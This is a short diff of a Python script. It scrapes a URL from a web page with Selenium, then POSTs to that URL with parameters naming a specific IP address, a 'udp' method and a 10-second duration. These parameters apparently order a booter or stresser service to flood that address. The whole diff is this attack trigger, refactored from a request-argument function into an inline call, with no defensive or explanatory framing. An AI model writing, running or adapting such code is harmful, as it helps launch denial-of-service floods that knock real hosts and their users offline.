@@ -40,18 +40,15 @@ def execute():
   time.sleep(7)
   url = driver.execute_script("return document.getElementById('weburl').innerText;")
   print(url)
-  send();
-  time.sleep(10)
-def send():
-  host = request.args.get('host')
-  length = request.args.get('length')
-  url = ""+host+"?host=137.184.30.68&method=udp&time=10"
+  url2 = ""+url+"?host=137.184.30.68&method=udp&time=10"
 
   headers = CaseInsensitiveDict()
   headers["Content-Type"] = "application/json"
   headers["Content-Length"] = "0"
 
 
-  resp = requests.post(url, headers=headers)
+  resp = requests.post(url2, headers=headers)
 
   print(resp.status_code)
+  time.sleep(10)
+
